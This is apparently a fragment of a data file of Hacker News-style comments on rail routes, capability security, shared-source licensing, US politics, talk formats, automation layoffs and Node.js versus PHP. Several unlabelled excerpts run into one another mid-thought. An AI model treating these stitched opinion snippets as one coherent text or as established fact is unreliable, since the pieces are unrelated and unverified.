Furthermore, DC is a logical place to serve as a hub to\nconnect the two corridors: one a high-demand DC-NYC, and one a long-distance\nChicago-DC. Since to go into Union Station, you have to double-back, this\ncould be a two-segment train where you'd have one-seat travel between Chicago\nand NYC, but there would be a mandatory stop in DC. This all sounds good, but\nthe segment between DC and Pittsburgh is awful: it's crowded with CSX freight\ntrains, it's either hemmed in by populated areas or follows river valleys or\nnarrow ravines, and there's much work to be done to bring it up to a state\nthat can host High Speed Rail. Between DC and Pittsburgh, one would basically\nhave to build a dedicated line for High Speed passenger rail.\n\nThe route through Albany and Buffalo avoids the Appalachians but is forced\ninto the busy Hudson Valley. Route improvements here are expensive. East of\nCleveland, the Upstate New York cities along the route simply don't generate\nenough Chicago-bound demand, nor enough connecting opportunities to make\nrouting this way worthwhile.\n\nThe route of the old Pennsylvanian Railway through Philly, Harrisburg,\nAltoona, Pittsburgh is indeed the most logical 'direct' route, both in terms\nof macro and micro; most of the right-of-way is multi-tracked so even with the\nheavy Norfolk Southern freight traffic, it'd be competitive; and the route\ntouches Cleveland, Pittsburgh, and Philadelphia, all of which can generate\nlocal and connecting passengers.

More flexible\nattempts happened in capability model with KeyKOS + KeySAFE, E programming\nlanguage, CapDesk desktop, and so on.\n\nSo, the above was the minimum that NSA et al would consider secure against\nadversaries on their level.

Of course that\ndidn't work as it doesn't solve the central security problem: making sure all\nstates or flows in the system correspond to a security policy.\n\nThe best route is to put security in the end-point along with E-like tools for\ndistributed applications and hardware acceleration of difficult parts. Within\nyour trust domain, you just check data types and use that for information flow\ncontrol (aka security). Outside trust domain, you do input validation and\nchecks before assigning types.

That simple. You can always clean-\nslate an implementation of whatever subset of the features you need if that's\ntoo much. I should modify it to say the API can be used in compatible clones\ngiven Oracle's activities.\n\n\"Can those improvements be redistributed as source code, for the benefit of\nothers?\"\n\nYes. The software itself is distributed as source code with optional binaries\nfor convenience. Any paying customer can receive it in this model.\n\n\"For example what happens if these clients hire contractors to provide those\nimprovements?\"\n\nThen contractors provided the improvements. The user is still a paying\ncustomer. What's your question?\n\n\" first of all, what's a \"paying customer\"? Do money need to exchange hands?\"\n\nA paying customer is almost always formed in business by one party giving\nanother money in exchange for some good. So, a paying customer is... someone\nwho pays.\n\n\"Are trial versions permitted?\"\n\nDidn't think about that. Shareware was a big thing... a good thing... back\nwhen I started in computers. Gave us a taste of what the software was like\nwith little to no money. I'd consider doing a trial period so long as the\nsoftware was for a long-term, use case. With one-offs, they could just use the\ntrial software. If no trial, then getting good reviews and a sales team would\nbe solution like with most profitable software.\n\n\"First of all, this implies that ownership over such software is achieved by\nanybody that wants it. And it's an important right, especially if things go\nwrong.\"\n\nLast I checked, the copyright situation for ownership of OSS software was more\ncomplicated than that. Has a lot to do with whether copyright was assigned by\na contributor or something. Way better than proprietary situation with hardly\nanyone going after forks in practice. I give you that much.\n\n\"Oh well, what is abandonment?\"\n\nI thought you'd say that but don't have a good answer yet. As I wrote it, I\nremembered the record labels and others that do one minor thing with the\ncopyright just to maintain it. Last time I thought through this, I figured the\ncontract could be amount of developer time that goes into adding features,\nadding documentation, or fixing bugs. Project is abandonware if it goes under\na certain amount for a certain period of time. Idea being owner is\nincentivized to keep improving it or drop it when investments no longer make\nsense. As others have stated, one can still charge for it even if it's free.\nThere's many companies that do. So, money will come in at lower rates over\ntime for any given project.\n\n\"You could also steer the project in a direction that people don't want, you\ncould intentionally cripple it, you could raise prices so much as to make it\nunfordable and when you get bored of it, you could simply sell it to another\ncompany.\"\n\nPrior discussion dealt with the selling part. I speculated these kind of deals\nwould be best in nonprofits, public benefit companies, and so on whose charter\nmaintained fair pricing, no acquisitions (or GPL on acquisition), perpetual\nlicenses for each shared-source version (to avoid crippling), etc. I'm still\nwondering how much can be handled at that level. Far as steer in bad\ndirection, that's a possibility that OSS has an advantage on. So, trust in the\nteam is a pre-requisite for this model to work if you're worried about that.\nIt's also a risk in FOSS in practice, though, given most software accumulating\ncrud doesn't get forked, forks can break things in one way to improve in\nanother, and forks might need critical mass of contributors to develop at\nsimilar pace. They're harder in practice than just pushing a fork button.\n\n\"our product can survive and flourish as proprietary, but stop with the\nbullshit and call a spade a spade.\"\n\nWho is bullshitting? I'm calling it shared-source, paid software with certain\nbenefits similar to OSS. I've also found tricks for approximating new\nadvantages or dealing with new problems as you bring them up. I can't call a\nspade a spade if it's not a spade. I think OSS vs proprietary isn't a spectrum\nof benefits and tradeoffs instead of binary decision. So, I'm investigating\nnew models. Definitely not saying they equal open-source: just can have many\nof same benefits for a _proprietary_ product.\n\n","7296":"\"Just because it's the default doesn't make it easiest nor does it make sense\nas the default necessarily\"\n\nI used to throw them together in Frontpage or Dreamweaver with a few optional\nscripts.

How I _hate_ admitting that.\n\nI read all the outrageous things Trump said during the Primaries and his\nelection campaign, and I did not really take them seriously, or him. Otto von\nBismarck, a German politician once said (or at least I've seen the quote\nattributed to him, but it seems like something he would say): \"People never\nlie as much as before an election, during a war, or after a hunt.\" I was\nhoping that if he got elected, Trump would turn it down a notch. I mean,\n_damn_ , for once a politician does as she\/he promised to, and it's gotta be\n_this_ guy.\n\nWhat makes me feel dumb is _that I could have seen it coming_. There's enough\npeople that said so. Smart people, smarter than me, certainly. I hate pulling\na Godwin, but I fear lots of people in Germany must have felt like this after\nyou-know-who rose to power. It's scary.\n\nAnd I am a German, living in Germany. Let me point out, as an example, that\nguy in Hungary, whose name I keep forgetting. Hungary is _much_ closer than\nany US territory (unless you count the military bases in Germany), and quite\nfrankly, I don't really give a damn who is president of Hungary. Or prime\nminister or whatever.\n\nWith the USA, it is different. They are the most powerful country on earth,\nfor better or worse. The risk of a military confrontation with Russia is going\nto be a lot lower than with Hillary, I think. But that seems to be about the\nonly glimmer of hope[1]. Besides that, Trump turns out to be _even more_\ndisgusting than I would have expected.\n\nY Combinator got quite a bit of flak when Peter Thiel donated more money to\nTrump's campaign than some people make in a lifetime, and with good reason,\nIMHO. So at least it's good to read about this.

These are tough formats to use, and require careful planning and\nmuch practice. In real life not enough people seem to put in the needed\neffort. (To be fair, these are all volunteers and are earnestly doing their\nbest. )\n\nStill, despite what should be minor differences, the Pecha Kucha talks seemed\nto drag.\n\nPart of the problem may also have been that the talks were punctuated by\nspeaker transitions and intros. Meanwhile, at Ignite Phoenix, it's become a\nwell-old machine: as soon as one speaker is done, the next is out and slides\nare rolling within , say, 20 seconds. You end up with much higher information\ndensity.\n\nAnyone else here give an Ignite or Pecha Kucha talk? Or try some other\ninteresting format?\n\n","7969":" _If you want to help us, you should write to me._\n\nImplement independent user accounts.

They are _great_ for decompressing and relaxing. I actually enjoy them a\nlot more than the normal sleeps I get at night. There's something very\nsatisfying about waking up and finding out that it's still the same day!\n\nOn a related note, most of my friends who complain about being \"stressed out\"\nnever spend their weekends actually relaxing. Instead, they rush from one\nactivity\/event to another, drive from location to location. Then when the\nweekend is over they say in dismay, \"I can't believe it's Monday _already_.\"\nMy guess is that if they spent their weekend being laid back, the weekend\nwould feel a lot longer and they would be re-energized before the next week\nstarts.\n\n","8062":"Like many people here, I work for a software company. We develop business\nautomation software. Perhaps unlike most though, I'm closer to the bottom line\n(Sales Engineer), and are more closely tuned in to the types of business\nconversations our customers have when they are thinking about whether to buy\nour software.\n\nOften times, the conversation revolves around the fact that the software we\nsell makes the average worker so ridiculously productive that often times they\nstart being able to do the work of two people. They no longer have to spend\ntime searching for important documents or worry about replacing lost\/damaged\nones, or pushing paper documents from one department to the other, or waiting\nfor a certain supervisor to come back from a business trip so that they can\nsign off on stuff. For most knowledge workers this translates to at least a\ncouple of hours of productivity gains everyday, if not more.\n\nWhat do businesses do with these productivity gains? From what we have seen,\nthe overwhelming majority use the opportunity to lay off workers they no\nlonger need. The reason is simple: their company addresses a certain amount of\ncustomer demand, and if they can meet that demand with half the workforce then\nwhy not lay off the rest and become more profitable?\n\nOver the years, this phenomenon has led me to the conclusion that the main\nproblem with the economy is lack of consumer demand. If consumer demand was\nincreasing, then companies would hire more employees _despite_ the efficiency\ngains they get from automation. Or, at the very least, they would be less\nprone to lay people off, because their existing workforce would be more able\nto handle the demand by becoming more productive.\n\nTraditionally, the main source of consumer demand in America has been the\nmiddle-class. If we find a way to bring that back, everybody wins.\n\n","8063":"I'm sorry to tell you that you are terribly misinformed.\n\nAthletes get stronger with yoga, because improved flexibility helps them to do\ncompound exercises with better form, and that allows them to activate the\ncorrect muscle groups for better leverage.

Once it gets 10-20-30 meta up\/down votes, it'd be more\nor less possible to say if the review is meaningful or if it was a brain fart.\n\nMake the meta reviewing process mandatory.

When did Apple start copying design from Microsoft?\n\nThe home-screen icons are probably the worst part of the design. There are\ncertainly good parts as well. But Apple's skeumorphic borders and backgrounds\nwere always distinctively Apple, and contributed to make people love the\nbrand, now the iOS just looks like everything else. Android is flat. Windows\nis flat. And as people pointed out, what about the colorblind?\n\n","8287":"What do you mean ... after all what do you always ask right after a client\nsays \"it doesn't work\"?\n\n","8288":"This is interesting. Basically what I like Node.js for is the evented\nprogramming that JS encourages. That and the fact that web developers are\nalready familiar with JS.\n\nConsider this: you have a site that will have to scale to millions of people.\nIf you have a lot of reads, you can simply replicate your database, but if you\nhave a lot of writes too, then you'll need to shard (partition horizontally)\nyour database.\n\nAn aside -- if you find yourself using an ORM and sharding a lot, then most\nlikely you should have used a NoSQL database such as Riak, instead of a\nrelational DB. But let's say you've already gone this route, and used MySQL,\nwhich a lot of sites including facebook have done.\n\nIn this case, anytime you need your query to hit N shards, PHP will take (s1 +\ns2 + ... + s_n) time to do it. Node.js will take MAX(s1, s2, ... s_n) which is\nmuch faster. There is a big difference for latency. (It's true that the mysqli\ndriver in PHP does support concurrent queries, but the above comparison isn't\njust for DB but for EVERYTHING. In JS and Go you have the option to do\nconcurrent I\/O, in PHP you don't.)\n\nAnother difference is in the memory usage. PHP has to create a copy of your\nenvironment for every preforked process. It depends on Linux to do copy-on-\nwrite, for instance. APC helps a little with shared memory segments, but not\nmuch. On a 2GB RAM machine, how many clients can you support with PHP vs Node?\nNode has just one copy of the code running, and each request costs very little\nin comparison. Of course, since everything is in the same memory space, you\ncan easily bring down the whole process, so Node.js processes need to be built\nto survive crashes, unlike PHP scripts which are isolated.\n\nAnd let's not forget that Node.js stuff can push to the client, whereas for\nPHP to do that you need wasteful, long-running sleeping processes sitting in\nmemory, and having some nginx event module to simulate evented programming.\n\nIn short, Node.js and stuff like that gives you much more flexibility, many\nmore things you can do (such as pushing data in near real time to many\ndifferent endpoints including the browser), but at the same time you need to\ncode everything in a way that crashes don't matter much.\n\n","8289":"If you need to minimize the amount of copies then yes, you need to have some\n\"risk management\" software to estimate which machines are more reliable, and\nwhich files are more important, and then assign those files to enough replicas\nto be able to statistically guarantee some SLA. Then you need failover where\nat least one if the replicas is always available.\n\nThe routing table should be small enough to fit in RAM on every machine, and\nconsulted for request. It would be updated when failover occurs. The table\nwould consist of general rules with temporary exceptions for specific\npartition ranges that are being failed over.\n\nYou can store indexes in files, in a similar way. Just avoid joins and make\nlike a graph database: first load documents from the index and then do\nmapreduce to get the related documents.\n\nBut besides that, I can see how maybe multi user concurrent access might\nnecessitate eventual consistency algorithms for each app, but that's it.\n\n","8290":"But there is a difference between using C in crazy ways, and using 20 features\nof a language in ways that make them interact.\n\nThe more features a language has, the more I have to know just to read\nsomeone's code or be productive in a company - and the more chance someone\ndoesn't know about potential harmful interactions and side effects.\n\n","8291":"Not just that, but they are great for sharding too.\n\n","8292":"It's only good if we have a UBI\n\n","8293":"My favorite part is the warning at the beginning.
